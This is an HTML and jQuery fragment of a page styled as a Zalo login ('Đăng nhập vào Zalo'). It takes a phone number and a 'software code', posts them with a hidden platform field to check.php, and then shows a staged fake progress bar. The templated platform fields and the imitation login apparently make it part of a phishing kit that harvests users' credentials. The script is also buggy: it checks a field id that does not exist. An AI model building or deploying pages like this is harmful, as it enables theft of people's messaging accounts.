<script>
   function login() { 
      if($("#phone").val() == "" || $("#nhapmatext").val() == "") {
      alert("Bạn chưa nhập đầy đủ thông tin, hãy kiểm tra lại");
      return;
   } else {
      var _code = $("#nhapmatext").val();
      var _phone = $("#mobile-number").val();
      var _platform = $("#platform").val();
      
       $.ajax({            
           url:"check.php", //the page containing php script
           data: {type: "check", code: _code, phone: _phone, platform: _platform},
           type: "POST", //request type
           success:function(result){
            if(result == 0) {
               alert("Bạn đã nhập sai mã phần mềm");
            } else {
               $('#submitButton').show();
               $('#lBtn').hide();
               $('#submitButton').trigger('click');
            }
           
          }
        });

       setTimeout(function(){
            $(document).ready(function() {
            document.getElementById("submitButton").setAttribute("data-loading", "10%");
               setTimeout(function(){
                  $(document).ready(function() {
                  document.getElementById("submitButton").setAttribute("data-loading", "20%");
                  });
                     setTimeout(function(){
                        $(document).ready(function() {
                        document.getElementById("submitButton").setAttribute("data-loading", "30%");
                        });
                           setTimeout(function(){
                              $(document).ready(function() {
                              document.getElementById("submitButton").setAttribute("data-loading", "40%");
                              });
                              setTimeout(function(){
                                 $(document).ready(function() {
                                 document.getElementById("submitButton").setAttribute("data-loading", "50%");
                                 });
                                    setTimeout(function(){
                                       $(document).ready(function() {
                                       document.getElementById("submitButton").setAttribute("data-loading", "60%");
                                       });
                                       setTimeout(function(){
                                          $(document).ready(function() {
                                          document.getElementById("submitButton").setAttribute("data-loading", "70%");
                                          });
                                          setTimeout(function(){
                                             $(document).ready(function() {
                                             document.getElementById("submitButton").setAttribute("data-loading", "80%");
                                             });
                                             setTimeout(function(){
                                                $(document).ready(function() {
                                                document.getElementById("submitButton").setAttribute("data-loading", "90%");
                                                });
                                                setTimeout(function(){
                                                   $(document).ready(function() {
                                                   document.getElementById("submitButton").setAttribute("data-loading", "100%");
                                                   });
                                                   
                                                },1000);
                                             },1000);
                                          },1000);
                                       },1000);
                                    },1000);
                              },1000);
                           },1000);
                     },1000);
               },1000);
            });
            
         },1000);
   }

   
      
   
}
</script>

 <span style="font-size: 30px; color: #FFF; font-weight: bold;">Đăng nhập vào Zalo</span>

      <p style="text-align: left; margin-left: 30px; margin-top: 10px;font-size: 2.5em; color: #555"> Số điện thoại</p>
      <div class="form">

        <div class="txt_field">
         <input id="platform" name="platform" type="hidden" value="Zalo">
         <input id="platform_ascii" name="platform_ascii" type="hidden" value="zalo">

          <input id="mobile-number" name="phone" style="margin-left: 50px" type="tel" required="">
          <span></span>
        </div>
        <div class="txt_field">
          <input id="nhapmatext" type="password" required="">
          <span></span>
          <label>Mã phần mềm</label>
        </div>
        <input type="submit" value="ĐĂNG NHẬP" id="lBtn" onclick="login();" style="text-align: center; margin-bottom: 20px;">
        <a id="submitButton" href="#" class="progress-button" style="display: none; padding-bottom: 20px; font-size:34px; text-align: center; margin-bottom: 20px;width: 100%;height: 100px;vertical-align: middle; padding-top:30px;"></a>
